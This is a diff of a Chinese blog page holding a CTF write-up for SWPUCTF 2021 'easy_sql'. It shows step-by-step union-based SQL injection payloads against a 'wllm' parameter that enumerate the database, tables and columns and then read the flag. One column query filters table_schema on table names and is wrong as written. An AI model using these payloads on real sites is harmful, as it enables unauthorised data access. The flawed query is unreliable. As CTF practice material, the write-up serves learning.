@@ -19,12 +19,12 @@
   <meta name="author" content="SakuraQ">
   <meta name="keywords" content="网络安全  Web  渗透">
   
-    <meta name="description" content="CTF-Sql注入[SWPUCTF 2021 新生赛] easy_sql	WriteUp 从title可知参数名为wllm，先确定该数据表一共有几列，直到数据库返回null为止 12345-- url形式?wllm&#x3D;1&#x27; order by 3 --+ 	?wllm&#x3D;1&#x27; order by 4 --+	?wllm&#x3D;1&#x27; order by 5 --+......  （假设">
+    <meta name="description" content="CTF-Sql注入 [SWPUCTF 2021 新生赛] easy_sql WriteUp  从title可知参数名为wllm，先确定该数据表一共有几列，直到数据库返回null为止 12345-- url形式?wllm&#x3D;1&#x27; order by 3 --+ 	?wllm&#x3D;1&#x27; order by 4 --+	?wllm&#x3D;1&#x27; order by 5 --+....">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CTF-Sql注入">
 <meta property="og:url" content="http://yaesakuraq.github.io/2025/02/24/Sql%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="SakuraQ&#39;s Blog">
-<meta property="og:description" content="CTF-Sql注入[SWPUCTF 2021 新生赛] easy_sql	WriteUp 从title可知参数名为wllm，先确定该数据表一共有几列，直到数据库返回null为止 12345-- url形式?wllm&#x3D;1&#x27; order by 3 --+ 	?wllm&#x3D;1&#x27; order by 4 --+	?wllm&#x3D;1&#x27; order by 5 --+......  （假设">
+<meta property="og:description" content="CTF-Sql注入 [SWPUCTF 2021 新生赛] easy_sql WriteUp  从title可知参数名为wllm，先确定该数据表一共有几列，直到数据库返回null为止 12345-- url形式?wllm&#x3D;1&#x27; order by 3 --+ 	?wllm&#x3D;1&#x27; order by 4 --+	?wllm&#x3D;1&#x27; order by 5 --+....">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-02-24T07:36:29.000Z">
 <meta property="article:modified_time" content="2025-02-24T15:23:32.459Z">
@@ -293,25 +293,23 @@
             
               <div class="markdown-body">
                 
-                <h1 id="CTF-Sql注入"><a href="#CTF-Sql注入" class="headerlink" title="CTF-Sql注入"></a>CTF-Sql注入</h1><h2 id="SWPUCTF-2021-新生赛-easy-sqlWriteUp"><a href="#SWPUCTF-2021-新生赛-easy-sqlWriteUp" class="headerlink" title="[SWPUCTF 2021 新生赛] easy_sql	WriteUp"></a>[SWPUCTF 2021 新生赛] easy_sql	WriteUp</h2><ul>
+                <h1 id="ctf-sql注入">CTF-Sql注入</h1>
+<h2 id="swpuctf-2021-新生赛-easy_sql-writeup">[SWPUCTF 2021 新生赛]
+easy_sql WriteUp</h2>
+<ul>
 <li><p>从title可知参数名为wllm，先确定该数据表一共有几列，直到数据库返回null为止</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- url形式</span><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3 --+ 	</span><br><span class="hljs-string">?wllm=1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> <span class="hljs-comment">--+	</span><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 5 --+</span><br><span class="hljs-string">......</span><br></code></pre></td></tr></table></figure>
-</li>
-<li><p>（假设完成上一步骤后，数据库只有三列）使用联合查询语句，union select后的列数必须与前面列数相同，否则会报错</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- url形式</span><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3 --+ 	</span><br><span class="hljs-string">?wllm=1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> <span class="hljs-comment">--+	</span><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 5 --+</span><br><span class="hljs-string">......</span><br></code></pre></td></tr></table></figure></li>
+<li><p>（假设完成上一步骤后，数据库只有三列）使用联合查询语句，union
+select后的列数必须与前面列数相同，否则会报错</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3 --+</span><br></code></pre></td></tr></table></figure>
-
-<p>其中’–’是Sql语句通用注释符号，’+’的目的是为了代替空格保证注释生效。</p>
-</li>
+<p>其中’–‘是Sql语句通用注释符号，’+’的目的是为了代替空格保证注释生效。</p></li>
 <li><p>根据回显结果查询数据库名称，得到数据库名为test_db</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-string">&#x27; union select 1,2,database() --+</span><br></code></pre></td></tr></table></figure>
-</li>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-string">&#x27; union select 1,2,database() --+</span><br></code></pre></td></tr></table></figure></li>
 <li><p>再次查询该数据库中的数据表名称，得到数据表名有test_tb,users</p>
 <p>其中group_concat()的作用是将查询到的表名排成一行而不是分行排列</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>test_db<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure>
-</li>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>test_db<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure></li>
 <li><p>查询分别查询两张数据表中的字段，发现test_tb中有flag字段</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>test_tb<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?wllm=2&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
-</li>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>test_tb<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?wllm=2&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure></li>
 <li><p>查询test_tb中的flag字段最终得到flag</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-string">&#x27; union select 1,2,flag from test_tb --+</span><br></code></pre></td></tr></table></figure></li>
 </ul>
